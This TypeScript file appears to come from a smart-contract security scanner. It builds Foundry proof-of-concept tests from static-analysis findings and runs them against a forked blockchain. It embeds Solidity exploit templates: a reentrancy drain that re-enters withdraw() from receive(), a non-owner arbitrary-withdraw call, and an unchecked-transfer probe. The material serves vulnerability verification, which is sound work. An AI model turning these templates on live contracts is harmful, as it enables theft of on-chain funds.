import { spawn } from 'child_process';
import * as fs from 'fs';
import * as path from 'path';
import type { Finding, PoCResult, Severity } from '../types/index.js';
import { CHAIN_RPC_ENV, CHAINS, SEVERITY_ORDER } from '../types/index.js';

const POC_DIR = path.resolve(process.cwd(), '.poc-workspace');

/**
 * PoC verification templates keyed by vulnerability class.
 * Each template is a Foundry test contract that attempts to exploit the pattern.
 */
const POC_TEMPLATES: Record<string, (target: string) => string> = {
  reentrancy: (target) => `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {
    function deposit() external payable;
    function withdraw() external;
    function withdraw(uint256 amount) external;
}

contract ReentrancyPoC is Test {
    ITarget target;
    uint256 attackCount;

    function setUp() public {
        target = ITarget(${target});
    }

    function testReentrancy() public {
        deal(address(this), 1 ether);
        uint256 balBefore = address(target).balance;
        target.deposit{value: 0.1 ether}();
        target.withdraw();
        uint256 balAfter = address(target).balance;
        // If we drained more than deposited, reentrancy worked
        assertTrue(address(this).balance > 0.1 ether, "Reentrancy exploit did not succeed");
    }

    receive() external payable {
        if (attackCount < 5 && address(target).balance > 0) {
            attackCount++;
            target.withdraw();
        }
    }
}
`,

  'arbitrary-send-eth': (target) => `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

interface ITarget {
    function withdraw(address to) external;
    function transfer(address to, uint256 amount) external;
}

contract ArbitrarySendPoC is Test {
    function setUp() public {}

    function testArbitrarySend() public {
        // Attempt to call withdraw/transfer as non-owner
        address attacker = address(0xBEEF);
        vm.prank(attacker);
        (bool success,) = ${target}.call(
            abi.encodeWithSignature("withdraw(address)", attacker)
        );
        // If this succeeds from non-owner, it's exploitable
        assertTrue(success, "Arbitrary send did not succeed");
    }
}
`,

  'unchecked-transfer': (target) => `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Test.sol";

contract UncheckedTransferPoC is Test {
    function setUp() public {}

    function testUncheckedReturn() public {
        // Send a failing transfer and check if contract handles it
        (bool success,) = ${target}.call(
            abi.encodeWithSignature("transfer(address,uint256)", address(0), 0)
        );
        // Log result for analysis
        emit log_named_string("Transfer call result", success ? "succeeded" : "failed");
    }
}
`,
};

/**
 * Maps Slither detector names to PoC template categories.
 */
const DETECTOR_TO_POC: Record<string, string> = {
  'reentrancy-eth': 'reentrancy',
  'reentrancy-no-eth': 'reentrancy',
  'reentrancy-benign': 'reentrancy',
  'reentrancy-events': 'reentrancy',
  'arbitrary-send-eth': 'arbitrary-send-eth',
  'arbitrary-send-erc20': 'arbitrary-send-eth',
  'unchecked-transfer': 'unchecked-transfer',
  'unchecked-lowlevel': 'unchecked-transfer',
};

export class PoCVerifier {
  private readonly rpcUrls: Map<string, string>;
  private readonly foundryAvailable: boolean;

  constructor() {
    // Collect RPC URLs from environment
    this.rpcUrls = new Map();
    for (const [chain, envVar] of Object.entries(CHAIN_RPC_ENV)) {
      const url = process.env[envVar];
      if (url) {
        this.rpcUrls.set(chain, url);
      }
    }

    // Check if Foundry (forge) is available
    this.foundryAvailable = this.checkFoundryInstalled();
  }

  get isAvailable(): boolean {
    return this.foundryAvailable && this.rpcUrls.size > 0;
  }

  /**
   * Attempt PoC verification for a critical/high finding.
   * Returns null if verification is not applicable or not available.
   */
  async verify(
    finding: Finding,
    contractAddress: string,
    chainId: number,
  ): Promise<PoCResult | null> {
    if (!this.isAvailable) {
      return null;
    }

    // Only attempt PoC for critical/high severity
    if (SEVERITY_ORDER[finding.severity] < SEVERITY_ORDER['high']) {
      return null;
    }

    // Find matching PoC template
    const pocCategory = DETECTOR_TO_POC[finding.detectorName];
    if (!pocCategory) {
      return {
        attempted: false,
        succeeded: false,
        exploitContract: null,
        forkBlockNumber: null,
        errorMessage: `No PoC template for detector: ${finding.detectorName}`,
        gasUsed: null,
      };
    }

    const template = POC_TEMPLATES[pocCategory];
    if (!template) {
      return {
        attempted: false,
        succeeded: false,
        exploitContract: null,
        forkBlockNumber: null,
        errorMessage: `No PoC template for category: ${pocCategory}`,
        gasUsed: null,
      };
    }

    // Resolve RPC URL for chain
    const chainName = Object.entries(CHAINS).find(([_, c]) => c.chainId === chainId)?.[0];
    if (!chainName) {
      return {
        attempted: false,
        succeeded: false,
        exploitContract: null,
        forkBlockNumber: null,
        errorMessage: `Unknown chain ID: ${chainId}`,
        gasUsed: null,
      };
    }

    const rpcUrl = this.rpcUrls.get(chainName);
    if (!rpcUrl) {
      return {
        attempted: false,
        succeeded: false,
        exploitContract: null,
        forkBlockNumber: null,
        errorMessage: `No RPC URL configured for ${chainName} (set ${CHAIN_RPC_ENV[chainName]})`,
        gasUsed: null,
      };
    }

    const targetLiteral = `address(${contractAddress})`;
    const exploitSource = template(targetLiteral);

    return this.runForgeTest(exploitSource, rpcUrl, contractAddress);
  }

  /**
   * Run a Foundry forge test against a forked network.
   */
  private async runForgeTest(
    soliditySource: string,
    rpcUrl: string,
    contractAddress: string,
  ): Promise<PoCResult> {
    const workDir = path.join(POC_DIR, `poc-${Date.now()}`);

    try {
      // Initialize minimal Foundry project
      fs.mkdirSync(path.join(workDir, 'src'), { recursive: true });
      fs.mkdirSync(path.join(workDir, 'test'), { recursive: true });

      fs.writeFileSync(
        path.join(workDir, 'foundry.toml'),
        `[profile.default]\nsrc = "src"\nout = "out"\nlibs = ["lib"]\n`,
      );

      fs.writeFileSync(
        path.join(workDir, 'test', 'PoC.t.sol'),
        soliditySource,
      );

      // Install forge-std (required for Test.sol)
      await this.execCommand('forge', ['install', 'foundry-rs/forge-std', '--no-git'], workDir, 30_000);

      // Run forge test with fork
      const result = await this.execCommand(
        'forge',
        [
          'test',
          '--fork-url', rpcUrl,
          '-vvv',
          '--no-match-test', 'testFail',
        ],
        workDir,
        120_000,
      );

      const succeeded = result.exitCode === 0 && result.stdout.includes('PASS');
      const gasMatch = result.stdout.match(/Gas used:\s*(\d+)/);

      return {
        attempted: true,
        succeeded,
        exploitContract: soliditySource,
        forkBlockNumber: this.extractBlockNumber(result.stdout),
        errorMessage: succeeded ? null : this.extractError(result.stderr || result.stdout),
        gasUsed: gasMatch?.[1] ?? null,
      };
    } catch (err) {
      return {
        attempted: true,
        succeeded: false,
        exploitContract: soliditySource,
        forkBlockNumber: null,
        errorMessage: err instanceof Error ? err.message : String(err),
        gasUsed: null,
      };
    } finally {
      // Cleanup
      try {
        fs.rmSync(workDir, { recursive: true, force: true });
      } catch {
        // Best effort
      }
    }
  }

  private checkFoundryInstalled(): boolean {
    try {
      const result = require('child_process').execSync('forge --version 2>/dev/null', {
        timeout: 5000,
        stdio: ['ignore', 'pipe', 'ignore'],
      });
      return true;
    } catch {
      return false;
    }
  }

  private execCommand(
    command: string,
    args: string[],
    cwd: string,
    timeoutMs: number,
  ): Promise<{ exitCode: number; stdout: string; stderr: string }> {
    return new Promise((resolve) => {
      const proc = spawn(command, args, {
        cwd,
        timeout: timeoutMs,
        stdio: ['ignore', 'pipe', 'pipe'],
      });

      let stdout = '';
      let stderr = '';

      proc.stdout?.on('data', (chunk: Buffer) => {
        stdout += chunk.toString();
      });
      proc.stderr?.on('data', (chunk: Buffer) => {
        stderr += chunk.toString();
      });

      proc.on('close', (code) => {
        resolve({ exitCode: code ?? 1, stdout, stderr });
      });

      proc.on('error', (err) => {
        resolve({ exitCode: 1, stdout, stderr: err.message });
      });
    });
  }

  private extractBlockNumber(output: string): number | null {
    const match = output.match(/Block:\s*(\d+)/i) || output.match(/fork.*block\s*#?(\d+)/i);
    return match ? Number(match[1]) : null;
  }

  private extractError(output: string): string {
    // Try to find the most relevant error line
    const lines = output.split('\n');
    const errorLine = lines.find(l =>
      l.includes('FAIL') || l.includes('Error') || l.includes('revert')
    );
    return errorLine?.trim() ?? output.slice(0, 500);
  }
}
